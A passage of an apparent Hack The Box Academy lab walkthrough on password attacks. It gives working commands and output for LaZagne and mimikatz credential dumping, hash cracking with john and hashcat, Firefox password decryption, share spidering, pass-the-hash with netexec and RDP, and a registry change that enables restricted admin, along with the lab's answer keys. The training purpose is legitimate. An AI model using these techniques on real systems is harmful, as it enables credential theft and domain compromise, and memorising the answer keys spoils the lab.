  000000  ...
  9aaa1d
CertUtil: -URLCache command completed successfully.
```

Then students will execute `lazagne.exe` with the `all` option to retrieve passwords for all the software.

Code: cmd

```cmd
C:\Windows\Temp\lazagne.exe all
```

```cmd-session
C:\Users\bob>C:\Windows\Temp\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.64
Login: ubuntu
Password: {hidden}
Port: 22


[+] 1 passwords have been found.
For more information launch it again with the -v option

elapsed time = 5.390816688537598
```

Students will submit the answer using the format: `username:password`.

Answer: `ubuntu:FSadmin123`

# Credential Hunting in Windows

## Question 4

### “What is the default password of every newly created Inlanefreight Domain user account? (Format: Case-Sensitive)“

Exploring the `C:\` drive, students will notice a non-default folder name `Automation&Scripts`.

![Password_Attacks_Walkthrough_Image_16.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_16.png)

Opening this folder, students will notice a `PowerShell` script named `BulkaddADusers.ps1`. Students will open this file with any text editor and will be able to see the password that every very newly created Inlanefreight Domain user account has.

![Password_Attacks_Walkthrough_Image_17.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_17.png)

Students will submit this password as the answer.

Answer: `Inlanefreightisgreat2022`

# Credential Hunting in Windows

## Question 5

### “What are the credentials to access the Edge-Router? (Format: username:password, Case-Sensitive)“

Exploring the C:\ drive, students will notice a non-default folder name `Automation&Scripts`.

![Password_Attacks_Walkthrough_Image_16.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_16.png)

Opening this folder, students will notice a folder named `AnsibleScripts` . Students will open this folder and realise that a file named `EdgeRouterConfigs` exists within it.

Students will open this file with any text editor and

![Password_Attacks_Walkthrough_Image_18.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_18.png)

Students will submit the answer using the format: `username:password`.

Answer: `edgeadmin:Edge@dmin123!`

# Linux Authentication Process

## Question 1

### “Download the attached ZIP file (linux-authentication-process.zip), and use single crack mode to find martin's password. What is it?“

Students will start by downloading the attached `.zip` file [linux-authentication-process.zip](https://academy.hackthebox.com/storage/modules/147/linux-authentication-process.zip).

Code: shell

```shell
wget -q https://academy.hackthebox.com/storage/modules/147/linux-authentication-process.zip
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dhuuhfndu9]─[~]
└──╼ [★]$ wget -q https://academy.hackthebox.com/storage/modules/147/linux-authentication-process.zip
```

Students will then `unzip` this file:

Code: shell

```shell
unzip linux-authentication-process.zip
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dhuuhfndu9]─[~]
└──╼ [★]$ unzip linux-authentication-process.zip 

Archive:  linux-authentication-process.zip
  inflating: passwd                  
  inflating: shadow
```

Once the file is extracted students will use `unshadow` and pass the `passwd` file as first argument and the `shadow` file as the second argument:

Code: shell

```shell
unshadow passwd shadow
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dhuuhfndu9]─[~]
└──╼ [★]$ unshadow passwd shadow

root:!:0:0:root:/root:/usr/bin/zsh
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin

<SNIP>

martin:$6$0XiU8Oe/pGpxWvdq$n6TgiYUVAXBUOO11C155Ea8nNpSVtFFVQveY6yExlOdPu99hY4V9Chi1KEy/lAluVFuVcvi8QCO1mCG6ra70A1:1000:1000:Martin Mendes:/home/martin:/usr/bin/zsh

<SNIP>
```

Students will grab the entire line related to user `martin` and either use a text editor or `cat` to write this line to a file:

Code: shell

```shell
cat << EOF > hash.txt
martin:\$6\$0XiU8Oe/pGpxWvdq\$n6TgiYUVAXBUOO11C155Ea8nNpSVtFFVQveY6yExlOdPu99hY4V9Chi1KEy/lAluVFuVcvi8QCO1mCG6ra70A1:1000:1000:Martin Mendes:/home/martin:/usr/bin/zsh
EOF
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dhuuhfndu9]─[~]
└──╼ [★]$ cat << EOF > hash.txt
martin:\$6\$0XiU8Oe/pGpxWvdq\$n6TgiYUVAXBUOO11C155Ea8nNpSVtFFVQveY6yExlOdPu99hY4V9Chi1KEy/lAluVFuVcvi8QCO1mCG6ra70A1:1000:1000:Martin Mendes:/home/martin:/usr/bin/zsh
EOF
```

Students will then use `john` in single attack mode using the `--single` flag to crack this hash:

Code: shell

```shell
john --single hash.txt 
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dhuuhfndu9]─[~]
└──╼ [★]$ john --single hash.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
{hidden}          (martin)     
1g 0:00:00:00 DONE (2025-06-06 04:56) 5.882g/s 4670p/s 4670c/s 4670C/s martin}..Martinmartin1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Students will submit user `martin` password as the answer.

Answer: `Martin1`

# Linux Authentication Process

## Question 2

### “Use a wordlist attack to find sarah's password. What is it?“

Students will start by downloading the attached `.zip` file [linux-authentication-process.zip](https://academy.hackthebox.com/storage/modules/147/linux-authentication-process.zip).

Code: shell

```shell
wget -q https://academy.hackthebox.com/storage/modules/147/linux-authentication-process.zip
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dhuuhfndu9]─[~]
└──╼ [★]$ wget -q https://academy.hackthebox.com/storage/modules/147/linux-authentication-process.zip
```

Students will then `unzip` this file:

Code: shell

```shell
unzip linux-authentication-process.zip
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dhuuhfndu9]─[~]
└──╼ [★]$ unzip linux-authentication-process.zip 

Archive:  linux-authentication-process.zip
  inflating: passwd                  
  inflating: shadow
```

Once the file is extracted students will use `unshadow` and pass the `passwd` file as first argument and the `shadow` file as the second argument:

Code: shell

```shell
unshadow passwd shadow
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dhuuhfndu9]─[~]
└──╼ [★]$ unshadow passwd shadow

root:!:0:0:root:/root:/usr/bin/zsh
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin

<SNIP>

sarah:$6$EBOM5vJAV1TPvrdP$LqsLyYkoGzAGt4ihyvfhvBrrGpVjV976B3dEubi9i95P5cDx1U6BrE9G020PWuaeI6JSNaIDIbn43uskRDG0U/:1001:1001:Sarah Saragaday:/home/sarah:/usr/bin/bash
```

Students will grab the entire line related to user `sarah` and either use a text editor or `cat` to write this line to a file:

Code: shell

```shell
cat << EOF > sarah_hash.txt
sarah:\$6\$EBOM5vJAV1TPvrdP\$LqsLyYkoGzAGt4ihyvfhvBrrGpVjV976B3dEubi9i95P5cDx1U6BrE9G020PWuaeI6JSNaIDIbn43uskRDG0U/:1001:1001:Sarah Saragaday:/home/sarah:/usr/bin/bash
EOF
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dhuuhfndu9]─[~]
└──╼ [★]$ cat << EOF > hash.txt
sarah:\$6\$EBOM5vJAV1TPvrdP\$LqsLyYkoGzAGt4ihyvfhvBrrGpVjV976B3dEubi9i95P5cDx1U6BrE9G020PWuaeI6JSNaIDIbn43uskRDG0U/:1001:1001:Sarah Saragaday:/home/sarah:/usr/bin/bash
EOF
```

Students will then use `hashcat` to crack this hash:

Code: shell

```shell
hashcat sarah_hash.txt /usr/share/wordlists/rockyou.txt.gz
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-dhuuhfndu9]─[~]
└──╼ [★]$ hashcat sarah_hash.txt /usr/share/wordlists/rockyou.txt.gz

hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
<SNIP>

Dictionary cache building /usr/share/wordlists/rockyou.txt.gz: 33553434 bytes (6Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$6$EBOM5vJAV1TPvrdP$LqsLyYkoGzAGt4ihyvfhvBrrGpVjV976B3dEubi9i95P5cDx1U6BrE9G020PWuaeI6JSNaIDIbn43uskRDG0U/:{hidden}
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$EBOM5vJAV1TPvrdP$LqsLyYkoGzAGt4ihyvfhvBrrGpVjV97...RDG0U/
Time.Started.....: Fri Jun  6 05:06:55 2025 (0 secs)
Time.Estimated...: Fri Jun  6 05:06:55 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)

<SNIP>
```

Students will submit user `sarah`'s password as the answer.

Answer: `mariposa`

# Credential Hunting in Linux

## Question 1

### “Examine the target and find out the password of the user Will. Then, submit the password as the answer.“

Students will start by opening an `SSH` session using the username `kira` and password `L0vey0u1!`.

Code: shell

```shell
ssh kira@STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-lrbrw5vw80]─[~]
└──╼ [★]$ ssh kira@10.129.143.236

The authenticity of host '10.129.143.236 (10.129.143.236)' can't be established.
ED25519 key fingerprint is SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.143.236' (ED25519) to the list of known hosts.
kira@10.129.143.236's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)

<SNIP>

kira@nix01:~$
```

Students will list the contents of `kira`'s home directory using `ls` and they will notice that a directory named `.mozilla` is present.

Code: shell

```shell
kira@nix01:~$ ls -la

<SNIP>
drwx------  3 kira kira 4096 Feb  9  2022 .local
drwx------  4 kira kira 4096 Feb  9  2022 .mozilla
drwxr-xr-x  2 kira kira 4096 Feb  9  2022 Music
<SNIP>
```

Students will look for the `logins.json` file instead `/home/kira/.mozilla/firefox/ytb95ytb.default-release`.

Students will return to their attack host and download `firefox_decrypt`:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-lrbrw5vw80]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py
```

Once this has finished downloading students will stand up a web server using `python3 -m http.server` module:

Code: shell

```shell
python3 -m http.server
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-lrbrw5vw80]─[~]
└──╼ [★]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Students will return to the remote host (`SSH` session) and download this file by doing:

Code: shell

```shell
wget PWNIP:8000/firefox_decrypt.py
```

```shell-session
kira@nix01:~/.mozilla/firefox/ytb95ytb.default-release$ wget -q 10.10.14.241:8000/firefox_decrypt.py
```

Students will then use `python3.9` to execute the python script:

Code: shell

```shell
python3.9 firefox_decrypt.py
```

```shell-session
kira@nix01:~/.mozilla/firefox/ytb95ytb.default-release$ python3.9 firefox_decrypt.py 

Select the Mozilla profile you wish to decrypt
1 -> lktd9y8y.default
2 -> ytb95ytb.default-release
```

Students will select the option `2` and the password for user `will` will be disclosed in the output.

```shell-session
python3.9 firefox_decrypt.py 

Select the Mozilla profile you wish to decrypt
1 -> lktd9y8y.default
2 -> ytb95ytb.default-release
2

Website:   https://dev.inlanefreight.com
Username: 'will@inlanefreight.htb'
Password: '{hidden}'
```

Answer: `TUqr7QfLTLhruhVbCP`

# Credential Hunting in Network Traffic

## Question 1

### “The packet capture contains cleartext credit card information. What is the number that was transmitted?“

Students will start by downloading the [credential-hunting-in-network-traffic.zip](https://academy.hackthebox.com/storage/modules/147/credential-hunting-in-network-traffic.zip) file and unzip it:

Code: shell

```shell
wget -q https://academy.hackthebox.com/storage/modules/147/credential-hunting-in-network-traffic.zip
unzip credential-hunting-in-network-traffic.zip
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-lrbrw5vw80]─[~]
└──╼ [★]$ wget -q https://academy.hackthebox.com/storage/modules/147/credential-hunting-in-network-traffic.zip

┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-lrbrw5vw80]─[~]
└──╼ [★]$ unzip credential-hunting-in-network-traffic.zip

Archive:  credential-hunting-in-network-traffic.zip
  inflating: demo.pcapng
```

From here students will open `Wireshark` either by using the GUI or via command line by executing `wireshark`.

On `Wireshark` users will press `Ctrl + O` to open a capture file and select the `demo.pcapng` file extracted before.

![Password_Attacks_Walkthrough_Image_19.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_19.png)

Once the file loads and `Wireshark` displays all 12348 packets, students will use the top bar to filter for `http` traffic. Analysing the traffic, students will see a `POST` request to the `/process_payment` endpoint which they will click.

At the bottom left of the `Wireshark` window, students will click on the small right faced arrow next to `HTLM Form URL Encoded: application/x-www-form-urlencoded` and all the details used by the user during the purchase process will be visible in plaintext, including the card number.

![Password_Attacks_Walkthrough_Image_20.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_20.png)

Students will submit the card number as the answer.

Answer: `5156 8829 4478 9834`

# Credential Hunting in Network Traffic

## Question 2

### “What is the SNMPv2 community string that was used?“

Students will start by downloading the [credential-hunting-in-network-traffic.zip](https://academy.hackthebox.com/storage/modules/147/credential-hunting-in-network-traffic.zip) file and unzip it:

Code: shell

```shell
wget -q https://academy.hackthebox.com/storage/modules/147/credential-hunting-in-network-traffic.zip
unzip credential-hunting-in-network-traffic.zip
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-lrbrw5vw80]─[~]
└──╼ [★]$ wget -q https://academy.hackthebox.com/storage/modules/147/credential-hunting-in-network-traffic.zip

┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-lrbrw5vw80]─[~]
└──╼ [★]$ unzip credential-hunting-in-network-traffic.zip

Archive:  credential-hunting-in-network-traffic.zip
  inflating: demo.pcapng
```

From here students will open `Wireshark` either by using the GUI or via command line by executing `wireshark`.

On `Wireshark` users will press `Ctrl + O` to open a capture file and select the `demo.pcapng` file extracted before.

![Password_Attacks_Walkthrough_Image_19.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_19.png)

Once the file loads and `Wireshark` displays all 12348 packets, students will use the top bar to filter for `snmp` traffic and select any packet.

At the bottom left of the `Wireshark` window, students will click on the small right faced arrow next to `Simple Network Management Protocol` and the name of the community string used will be populated.

![Password_Attacks_Walkthrough_Image_21.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_21.png)

Students will submit the community string name as the answer.

Answer: `s3cr3tSNMPC0mmun1ty`

# Credential Hunting in Network Traffic

## Question 3

### “What is the password of the user who logged into FTP?“

Students will start by downloading the [credential-hunting-in-network-traffic.zip](https://academy.hackthebox.com/storage/modules/147/credential-hunting-in-network-traffic.zip) file and unzip it:

Code: shell

```shell
wget -q https://academy.hackthebox.com/storage/modules/147/credential-hunting-in-network-traffic.zip
unzip credential-hunting-in-network-traffic.zip
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-lrbrw5vw80]─[~]
└──╼ [★]$ wget -q https://academy.hackthebox.com/storage/modules/147/credential-hunting-in-network-traffic.zip

┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-lrbrw5vw80]─[~]
└──╼ [★]$ unzip credential-hunting-in-network-traffic.zip

Archive:  credential-hunting-in-network-traffic.zip
  inflating: demo.pcapng
```

From here students will open `Wireshark` either by using the GUI or via command line by executing `wireshark`.

On `Wireshark` users will press `Ctrl + O` to open a capture file and select the `demo.pcapng` file extracted before.

![Password_Attacks_Walkthrough_Image_19.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_19.png)

Once the file loads and `Wireshark` displays all 12348 packets, students will use the top bar to filter for `ftp` traffic and select the packet that contains `Request: PASS` in the `Info` column.

At the bottom left of the `Wireshark` window, students will click on the small right faced arrow next to `File Transfer Protocol (FTP)` and the plaintext password to login to `FTP` will be readable.

![Password_Attacks_Walkthrough_Image_22.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_22.png)

Students will submit the password as the answer.

Answer: `qwerty123`

# Credential Hunting in Network Traffic

## Question 4

### “What file did the user download over FTP?“

Students will start by downloading the [credential-hunting-in-network-traffic.zip](https://academy.hackthebox.com/storage/modules/147/credential-hunting-in-network-traffic.zip) file and unzip it:

Code: shell

```shell
wget -q https://academy.hackthebox.com/storage/modules/147/credential-hunting-in-network-traffic.zip
unzip credential-hunting-in-network-traffic.zip
```

```shell-session
┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-lrbrw5vw80]─[~]
└──╼ [★]$ wget -q https://academy.hackthebox.com/storage/modules/147/credential-hunting-in-network-traffic.zip

┌─[eu-academy-1]─[10.10.14.241]─[htb-ac-569447@htb-lrbrw5vw80]─[~]
└──╼ [★]$ unzip credential-hunting-in-network-traffic.zip

Archive:  credential-hunting-in-network-traffic.zip
  inflating: demo.pcapng
```

From here students will open `Wireshark` either by using the GUI or via command line by executing `wireshark`.

On `Wireshark` users will press `Ctrl + O` to open a capture file and select the `demo.pcapng` file extracted before.

![Password_Attacks_Walkthrough_Image_19.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_19.png)

Once the file loads and `Wireshark` displays all 12348 packets, students will use the top bar to filter for `ftp` traffic and select the packet that contains `Request: RETR` in the `Info` column.

At the bottom left of the `Wireshark` window, students will click on the small right faced arrow next to `File Transfer Protocol (FTP)` and the filename will be readable.

![Password_Attacks_Walkthrough_Image_23.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_23.png)

Students will submit the name of the file, including the extension as the answer.

Answer: `creds.txt`

# Credential Hunting in Network Shares

## Question 1

### “One of the shares mendres has access to contains valid credentials of another domain user. What is their password?“

Students will check what shares does the user `mendres` has READ access over:

Code: shell

```shell
nxc smb STMIP -u mendres -p 'Inlanefreight2025!' --shares
```

```shell-session
┌─[eu-academy-1]─[10.10.15.10]─[htb-ac-569447@htb-7d5c86pppf]─[~]
└──╼ [★]$ nxc smb 10.129.232.180 -u mendres -p 'Inlanefreight2025!' --shares

SMB         10.129.232.180  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)
SMB         10.129.232.180  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025!
SMB         10.129.232.180  445    DC01             [*] Enumerated shares
SMB         10.129.232.180  445    DC01             Share           Permissions     Remark
SMB         10.129.232.180  445    DC01             -----           -----------     ------
SMB         10.129.232.180  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.180  445    DC01             C$                              Default share
SMB         10.129.232.180  445    DC01             Company         READ        
SMB         10.129.232.180  445    DC01             Finance                     
SMB         10.129.232.180  445    DC01             HR              READ        
SMB         10.129.232.180  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.180  445    DC01             IT              READ        
SMB         10.129.232.180  445    DC01             Marketing                   
SMB         10.129.232.180  445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.232.180  445    DC01             Sales                       
SMB         10.129.232.180  445    DC01             SYSVOL          READ            Logon server share
```

Students will then create a `RDP` session as `mendres` using `xfreerdp`:

Code: shell

```shell
xfreerdp /v:10.129.232.180 /u:mendres /p:Inlanefreight2025!
```

```shell-session
┌─[eu-academy-1]─[10.10.15.10]─[htb-ac-569447@htb-7d5c86pppf]─[~]
└──╼ [★]$ xfreerdp /v:10.129.232.180 /u:mendres /p:Inlanefreight2025!

<SNIP>
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will then use `Windows PowerShell` to recursively search for the string `INLANEFREIGHT\` through the shares which `mendres` has READ access.

![Password_Attacks_Walkthrough_Image_24.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_24.png)

Code: powershell

```powershell
Get-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\IT | Select-String -Pattern "INLANEFREIGHT\\"
```

```powershell-session
PS C:\Users\mendres> Get-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\IT | Select-String -Pattern "INLANEFREIGHT\\"

Get-ChildItem : Access to the path '\\DC01.inlanefreight.local\IT\Admin' is denied.
At line:1 char:1
+ Get-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\IT | S ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\DC01.inlanefreight.local\IT\Admin:String) [Get-ChildItem], Unauthor
   izedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand


\\DC01.inlanefreight.local\IT\Tools\split_tunnel.txt:5:# Auth backup password: INLANEFREIGHT\jbader:{hidden}
```

Students will submit the password found as the answer.

Answer: `ILovePower333###`

# Credential Hunting in Network Shares

## Question 2

### “As this user, search through the additional shares they have access to and identify the password of a domain administrator. What is it?“

Students need to use `netexec` using previous found credentials from `question 1` to spider the `HR` share using the `--content` and `--pattern` with the value of `Administrator`:

Code: shell

```shell
nxc smb STMIP -u jbader -p 'ILovePower333###' --spider HR --content --pattern "Administrator"
```

```shell-session
┌─[eu-academy-1]─[10.10.15.10]─[htb-ac-569447@htb-tnt92bv9ou]─[~]
└──╼ [★]$ nxc smb 10.129.234.173 -u jbader -p 'ILovePower333###' --spider HR --content --pattern "Administrator"

SMB         10.129.234.173  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)
SMB         10.129.234.173  445    DC01             [+] inlanefreight.local\jbader:ILovePower333### 
SMB         10.129.234.173  445    DC01             [*] Started spidering
SMB         10.129.234.173  445    DC01             [*] Spidering .
SMB         10.129.234.173  445    DC01             //10.129.234.173/HR/Confidential/Onboarding_Docs_132.txt [lastm:'2025-05-01 12:33' size:1167 offset:1167 pattern:'Administrator']
SMB         10.129.234.173  445    DC01             [*] Done spidering (Completed in 10.00116515159607)
```

Students will then connect to the `HR` share using `jbader` credentials and download `Onboarding_Docs_132.txt`:

Code: shell

```shell
smbclient //10.129.232.180/HR -U jbader
```

```shell-session
┌─[eu-academy-1]─[10.10.15.10]─[htb-ac-569447@htb-tnt92bv9ou]─[~]
└──╼ [★]$ smbclient //10.129.232.180/HR -U jbader

Password for [WORKGROUP\jbader]:
Try "help" to get a list of possible commands.
smb: \> cd Confidential

smb: \Confidential\> get Onboarding_Docs_132.txt 
getting file \Confidential\Onboarding_Docs_132.txt of size 1167 as Onboarding_Docs_132.txt (103.6 KiloBytes/sec) (average 103.6 KiloBytes/sec)

smb: \Confidential\> exit
```

Students will then read the contents of this file by using `cat` and submit the password as the answer:

Code: shell

```shell
cat Onboarding_Docs_132.txt 
```

```shell-session
┌─[eu-academy-1]─[10.10.15.10]─[htb-ac-569447@htb-tnt92bv9ou]─[~]
└──╼ [★]$ cat Onboarding_Docs_132.txt 

========================================
Employee Onboarding Checklist
========================================

Name: Josh Bader  
Start Date: 2025-04-29  
Department: IT Infrastructure  
Manager: R. Lawson  
Title: Systems Engineer III  
Role Level: Tier-0 Admin  

Checklist:
[✔] AD Account Created  
[✔] Email Provisioned  
[✔] Assigned to Admin VPN Group  
[✔] Azure Admin Portal Access  
[✔] Exchange Online Admin  
[✔] Domain Admin Rights Applied  

Notes:
Jordan will be responsible for oversight of Active Directory replication, GPO management, and DC patching. Temporarily granted access to the domain administrator account for initial 90 days to complete infrastructure tasks related to the Chicago DC migration.

Account credentials
**Username:** `Administrator`  
**Password:** `{hidden}`  

Note: Update account group membership after probationary period. Audit required every 30 days.

Action Items:
- Schedule orientation w/ Infosec (B. Chen)
- Issue YubiKey (Asset #YK-78218)
- Complete privileged access training (SecOps LMS)

-- Document Created by R.Lawson on 2025-04-28
```

Answer: `Str0ng_Adm1nistrat0r_P@ssword_2025!`

# Pass the Hash (PtH)

## Question 1

### “Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.“

Students will use `netexec` with the Administrator `NTLM` hash and they can execute command directly by using the `-x` option, retrieving the flag:

Code: shell

```shell
nxc smb STMIP -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x 'type C:\pth.txt'
```

```shell-session
┌─[eu-academy-1]─[10.10.15.10]─[htb-ac-569447@htb-7d5c86pppf]─[~]
└──╼ [★]$ netexec smb 10.129.167.195 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x 'type C:\pth.txt'

SMB         10.129.167.195  445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.167.195  445    MS01             [+] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB         10.129.167.195  445    MS01             [+] Executed command via wmiexec
SMB         10.129.167.195  445    MS01             {hidden}
```

Answer: `G3t_4CCE$$_V1@_PTH`

# Pass the Hash (PtH)

## Question 2

### “Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.“

Reading the section, students will refer to the section below to find the answer:

![Password_Attacks_Walkthrough_Image_25.png](https://academy.hackthebox.com/storage/walkthroughs/11/Password_Attacks_Walkthrough_Image_25.png)

Answer: `DisableRestrictedAdmin`

# Pass the Hash (PtH)

## Question 3

### “Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?“

First, students need to change the registry key `DisableRestrictedAdmin` to `0` in order to login as the Administrator via RDP. For this, students can use `netexec` with the `-x` option to execute a command:

Code: shell

```shell
nxc smb STMIP -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```

```shell-session
┌─[eu-academy-1]─[10.10.15.10]─[htb-ac-569447@htb-7d5c86pppf]─[~]
└──╼ [★]$ nxc smb 10.129.167.195 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'

SMB         10.129.167.195  445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.167.195  445    MS01             [+] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB         10.129.167.195  445    MS01             [+] Executed command via wmiexec
SMB         10.129.167.195  445    MS01             The operation completed successfully.
```

`The operation completed successfully.` will show up in the `netexec` output and students will now use `xfreerdp` to establish a RDP session as Administrator:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
```

```shell-session
┌─[eu-academy-1]─[10.10.15.10]─[htb-ac-569447@htb-7d5c86pppf]─[~]
└──╼ [★]$ xfreerdp /v:10.129.167.195 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453

<SNIP>

The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will then leverage `mimikatz` that is located in `C:\tools\` to list all available provider credentials.

Code: cmd

```cmd
C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

```cmd-session
C:\Users\Administrator>C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

<SNIP>

Authentication Id : 0 ; 289420 (00000000:00046a8c)
Session           : Service from 0
User Name         : david
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 6/8/2025 12:41:55 PM
SID               : S-1-5-21-3325992272-2815718403-617452758-1107
        msv :
         [00000003] Primary
         * Username : david
         * Domain   : INLANEFREIGHT
